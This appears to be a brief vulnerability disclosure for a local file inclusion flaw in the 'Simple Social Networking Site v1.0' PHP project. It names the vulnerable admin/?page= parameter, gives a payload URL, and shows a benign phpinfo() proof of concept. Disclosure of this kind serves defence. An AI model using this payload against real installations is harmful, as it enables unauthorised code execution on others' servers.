# Simple Social Networking Site v1.0 by oretnom23 has The local file contains

vendor : https://www.sourcecodester.com/php/15311/simple-social-networking-site-instagram-phpoop-free-source-code.html

Vulnerability File: ip/sns/admin/?page=

Vulnerability location: ip/sns/admin/?page=, p

Payload: ip/sns/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/166926955-cb2893fe-2282-4e85-897e-76e892d20434.png)

We create a shell.php under the PHP file of the root of the website, which reads "<?" phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/166926826-1c256fc5-9342-4ac3-bbfb-2459f8dc6b73.png)

And visit http://sns/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/166927034-eab4e480-abf4-4881-8038-eb241afa1d97.png)
